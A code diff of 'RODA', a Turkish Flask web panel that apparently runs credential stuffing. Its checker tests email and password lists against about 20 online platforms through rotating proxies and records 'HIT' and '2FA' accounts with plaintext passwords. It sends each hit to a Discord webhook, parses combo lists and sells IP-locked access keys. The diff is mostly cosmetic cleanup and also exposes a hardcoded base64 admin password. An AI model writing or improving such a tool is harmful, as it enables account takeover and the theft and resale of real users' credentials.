@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-RODA - TAM SİSTEM (SON VERSİYON)
-Admin Key Gizli | 20 Platform | Log Sistemi | 2 Parse Modu | Webhook | 1 Key 1 IP
+RODA - TAM SİSTEM
+Renk: #60FF00 + #009fc5 | Login Çalışır | 20 Platform | Log Sistemi
 """
 
 import os, json, re, time, random, string, threading, concurrent.futures, base64
@@ -15,18 +15,14 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ============================================================
-# ADMIN KEY - GİZLİ (BASE64 + ORTAM DEĞİŞKENİ)
+# ADMIN KEY - GİZLİ
 # ============================================================
-# Orijinal: Roda@2026#Secure!X7 (base64: Um9kYUAyMDI2I1NlY3VyZSFYNw==)
 ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
 MASTER_KEY = os.environ.get("RODA_MASTER_KEY") or base64.b64decode(ENCODED_MASTER).decode('utf-8')
 
 KEYS_FILE = "keys.json"
 LOGS_FILE = "logs.json"
 
-# ============================================================
-# DOSYA İŞLEMLERİ
-# ============================================================
 def load_keys():
     if os.path.exists(KEYS_FILE):
         with open(KEYS_FILE, "r", encoding="utf-8") as f:
@@ -173,11 +169,14 @@ def index():
 
 @app.route("/api/login", methods=["POST"])
 def login():
-    data = request.json
-    key = data.get("key", "").strip()
-    client_ip = request.remote_addr
-    valid, role = is_key_valid(key, client_ip)
-    return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})
+    try:
+        data = request.json
+        key = data.get("key", "").strip()
+        client_ip = request.remote_addr
+        valid, role = is_key_valid(key, client_ip)
+        return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
 
 @app.route("/api/checker", methods=["POST"])
 def checker():
@@ -340,7 +339,6 @@ def scan():
     if not is_admin(key):
         return jsonify({"error": "Yetkisiz"}), 401
     domain = request.args.get("domain")
-    # Simülasyon (gerçek tarama yok)
     import random
     def generate():
         endpoints = [f"/api/v{random.randint(1,4)}/{random.choice(['auth','user','data','config'])}" for _ in range(10)]
@@ -350,7 +348,7 @@ def scan():
     return Response(generate(), mimetype="text/event-stream")
 
 # ============================================================
-# HTML - YENİ RENKLER (#60FF00 ve #009FC5)
+# HTML - RENK: #60FF00 + #009fc5
 # ============================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -364,7 +362,7 @@ HTML_TEMPLATE = """
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
 body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
-:root{--p:#60FF00;--p2:#009FC5;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(96,255,0,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
+:root{--p:#60FF00;--p2:#009fc5;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(96,255,0,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
 #login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg)}
 #login-box{width:400px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 20px 50px rgba(96,255,0,0.08)}
 #login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
@@ -546,7 +544,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <div class="sidebar-footer">© 2026 Roda</div>
 </div>
-<div id="app">
+<div id="app" style="display:none">
 <div class="topbar">
 <div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
 <div class="topbar-right">
@@ -557,7 +555,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <div class="main-content">
-<!-- CHECKER -->
 <div id="page-checker" class="page active">
 <div class="card">
 <h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
@@ -584,12 +581,9 @@ input:checked+.slider:before{transform:translateX(18px)}
 <label><input type="radio" name="chkFilter" value="2fa"> 2FA</label>
 <label><input type="radio" name="chkFilter" value="error"> Hata</label>
 </div>
-<div class="checker-results" id="checkerResults">
-<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div>
+<div class="checker-results" id="checkerResults"><div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div></div>
 </div>
 </div>
-</div>
-<!-- WEBHOOK -->
 <div class="card">
 <h3><i class="fa-solid fa-link"></i> Webhook Ayarları</h3>
 <p style="font-size:12px;color:var(--muted);margin-bottom:8px">Sadece <span style="color:var(--g)">HIT</span> bulunduğunda Discord'a gönderir.</p>
@@ -600,27 +594,15 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
 </div>
-<!-- HIT PANEL -->
 <div class="card">
 <h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
-<div class="hit-filter">
-<select id="hitPlatformFilter" onchange="renderHits()">
-<option value="all">Tüm Platformlar</option>
-</select>
-</div>
+<div class="hit-filter"><select id="hitPlatformFilter" onchange="renderHits()"><option value="all">Tüm Platformlar</option></select></div>
 <div class="hit-panel">
-<div class="hit-box">
-<h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4>
-<div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div>
-</div>
-<div class="hit-box">
-<h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4>
-<div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
+<div class="hit-box"><h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4><div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div></div>
+<div class="hit-box"><h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4><div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div></div>
 </div>
 </div>
 </div>
-</div>
-<!-- PROXY -->
 <div id="page-proxy" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
@@ -632,13 +614,10 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
 <label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
 </div>
-<div class="proxy-area">
-<textarea id="proxyList" placeholder="ip:port&#10;ip:port"></textarea>
-</div>
+<div class="proxy-area"><textarea id="proxyList" placeholder="ip:port"></textarea></div>
 <div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
 </div>
 </div>
-<!-- API KEŞİF (ADMIN) -->
 <div id="page-discovery" class="page">
 <div class="card" style="padding:10px 14px">
 <div class="scan-top">
@@ -666,7 +645,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="resultsList"></div>
 </div>
 </div>
-<!-- AYRIŞTIRMA -->
 <div id="page-parse" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
@@ -683,16 +661,13 @@ input:checked+.slider:before{transform:translateX(18px)}
 <button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
 <button class="btn sm" style="background:#6c7a8f" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
 </div>
-<div class="parse-result" id="parseResult">
-<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>
-</div>
+<div class="parse-result" id="parseResult"><div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div></div>
 <div style="margin-top:6px;font-size:12px;color:var(--muted)">
 <span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
 </div>
 </div>
 </div>
 </div>
-<!-- İSTATİSTİK -->
 <div id="page-stats" class="page">
 <h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
 <div class="stat-grid">
@@ -703,7 +678,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="stat-card-custom"><h3>Toplam 2FA</h3><p id="statTotal2fa">0</p></div>
 </div>
 </div>
-<!-- KEY YÖNETİMİ (ADMIN) -->
 <div id="page-keys" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
@@ -718,7 +692,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
 </div>
-<!-- LOGLAR (ADMIN) -->
 <div id="page-logs" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-history"></i> Loglar</h3>
@@ -728,12 +701,8 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <div style="overflow-x:auto">
 <table class="logs-table">
-<thead>
-<tr><th>Key</th><th>Platform</th><th>Email</th><th>Durum</th><th>Tarih</th><th>IP</th></tr>
-</thead>
-<tbody id="logsBody">
-<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px">Yükleniyor...</td></tr>
-</tbody>
+<thead><tr><th>Key</th><th>Platform</th><th>Email</th><th>Durum</th><th>Tarih</th><th>IP</th></tr></thead>
+<tbody id="logsBody"><tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px">Yükleniyor...</td></tr></tbody>
 </table>
 </div>
 </div>
@@ -741,9 +710,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <script>
-// ============================================================
-// GLOBAL
-// ============================================================
 var currentKey = "";
 var isAdmin = false;
 var scanning = false;
@@ -780,27 +746,16 @@ var platforms = [
     {name:"PUBG", domain:"pubg.com", icon:"fa-solid fa-crosshairs"}
 ];
 
-// ============================================================
-// LOGIN
-// ============================================================
 function doLogin() {
     var k = document.getElementById("authKey").value.trim();
-    if (!k) {
-        alert("Anahtar girin!");
-        return;
-    }
-    console.log("Login deneniyor:", k);
+    if (!k) { alert("Anahtar girin!"); return; }
     fetch("/api/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ key: k })
     })
-    .then(function(res) {
-        console.log("Cevap:", res.status);
-        return res.json();
-    })
+    .then(function(r) { return r.json(); })
     .then(function(d) {
-        console.log("Veri:", d);
         if (d.success) {
             currentKey = k;
             isAdmin = d.isAdmin || false;
@@ -810,8 +765,6 @@ function doLogin() {
                 document.getElementById("userBadge").style.display = "inline-block";
                 loadKeys();
                 loadLogs();
-            } else {
-                document.getElementById("userBadge").style.display = "none";
             }
             loadPlatforms();
             loadDiscoveryPlatforms();
@@ -825,22 +778,16 @@ function doLogin() {
         }
     })
     .catch(function(e) {
-        console.error("Hata:", e);
         alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?");
+        console.error(e);
     });
 }
-document.getElementById("authKey").addEventListener("keypress", function(e) {
-    if (e.key === "Enter") doLogin();
-});
 
-// ============================================================
-// WEBHOOK
-// ============================================================
 function saveWebhook() {
     var url = document.getElementById("webhookUrl").value.trim();
     if (url) {
         localStorage.setItem("roda_webhook_url", url);
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT)</span>';
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
     } else {
         localStorage.removeItem("roda_webhook_url");
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
@@ -868,20 +815,13 @@ function testWebhook() {
         body: JSON.stringify({ content: "🧪 **Roda Test** Webhook çalışıyor!" })
     })
     .then(function(r) {
-        if (r.ok) {
-            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Test başarılı!</span>';
-        } else {
-            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Test başarısız!</span>';
-        }
+        document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>';
     })
     .catch(function(e) {
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
     });
 }
 
-// ============================================================
-// PLATFORM YÜKLEME
-// ============================================================
 function loadPlatforms() {
     var sel = document.getElementById("checkerPlatformSelect");
     sel.innerHTML = "";
@@ -931,9 +871,6 @@ function loadHitFilter() {
     });
 }
 
-// ============================================================
-// HIT KAYDETME
-// ============================================================
 function addHit(platform, email, password, status) {
     if (!hitData[platform]) {
         hitData[platform] = { hits: [], twofa: [] };
@@ -986,9 +923,6 @@ function renderHits() {
         twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
 }
 
-// ============================================================
-// İSTATİSTİK
-// ============================================================
 function updateStatsUI() {
     document.getElementById("sideTotal").innerText = foundEndpoints.length;
     var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
@@ -998,7 +932,6 @@ function updateStatsUI() {
     document.getElementById("sideAPI").innerText = api;
     document.getElementById("sideAdmin").innerText = admin;
     document.getElementById("statEndpoints").innerText = foundEndpoints.length;
-
     var totalHit = 0, total2fa = 0;
     for (var p in hitData) {
         if (hitData[p].hits) totalHit += hitData[p].hits.length;
@@ -1008,9 +941,6 @@ function updateStatsUI() {
     document.getElementById("statTotal2fa").innerText = total2fa;
 }
 
-// ============================================================
-// CHECKER
-// ============================================================
 function resetCheckerStats() {
     document.getElementById("chkTotal").innerText = 0;
     document.getElementById("chkHit").innerText = 0;
@@ -1124,17 +1054,13 @@ document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
 function sendCheckerWebhook(platform, email, password) {
     var url = getWebhookUrl();
     if (!url) return;
-    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
     fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: content })
+        body: JSON.stringify({ content: "✅ **" + platform + " HIT!**\n" + email + " | " + password })
     }).catch(function(e) { console.error("Webhook hatası:", e); });
 }
 
-// ============================================================
-// AYRIŞTIRMA
-// ============================================================
 function setParseMode(mode, btn) {
     parseMode = mode;
     document.querySelectorAll(".parse-tabs button").forEach(function(b) {
@@ -1219,9 +1145,6 @@ function loadParseFile() {
     input.click();
 }
 
-// ============================================================
-// SAYFA GEÇİŞİ
-// ============================================================
 function switchPage(page) {
     if ((page === "discovery" || page === "keys" || page === "logs") && !isAdmin) {
         alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
@@ -1256,9 +1179,6 @@ function switchPage(page) {
     }
 }
 
-// ============================================================
-// PROXY
-// ============================================================
 function fetchProxies() {
     document.getElementById("proxyCount").innerText = "Çekiliyor...";
     fetch("/api/fetch_proxies")
@@ -1281,9 +1201,6 @@ function toggleProxy() {
     useProxy = document.getElementById("useProxy").checked;
 }
 
-// ============================================================
-// KEY YÖNETİMİ (ADMIN)
-// ============================================================
 function loadKeys() {
     if (!isAdmin) return;
     fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
@@ -1340,9 +1257,6 @@ function deleteKey(target) {
     .catch(function(e) { alert("Hata: " + e.message); });
 }
 
-// ============================================================
-// LOGLAR (ADMIN)
-// ============================================================
 function loadLogs() {
     if (!isAdmin) return;
     fetch("/api/admin/logs?key=" + encodeURIComponent(currentKey))
@@ -1390,9 +1304,6 @@ function clearLogs() {
     .catch(function(e) { alert("Hata: " + e.message); });
 }
 
-// ============================================================
-// API KEŞİF (ADMIN)
-// ============================================================
 function startScan() {
     if (!isAdmin) {
         alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
@@ -1474,9 +1385,6 @@ document.getElementById("filterContainer").addEventListener("change", function()
     });
 });
 
-// ============================================================
-// BAŞLAT
-// ============================================================
 document.getElementById("authKey").addEventListener("keypress", function(e) {
     if (e.key === "Enter") doLogin();
 });
@@ -1503,7 +1411,7 @@ if __name__ == "__main__":
     ║     ✅ 20 Platform | ✅ 2 Parse Modu | ✅ Webhook             ║
     ║     ✅ 1 Key = 1 IP | ✅ Admin Log Sistemi                   ║
     ║     ✅ Key Süresi: Dakika/Saat/Gün                           ║
-    ║     ✅ Yeni Renkler: #60FF00 ve #009FC5                     ║
+    ║     ✅ Renk: #60FF00 + #009fc5                               ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
 
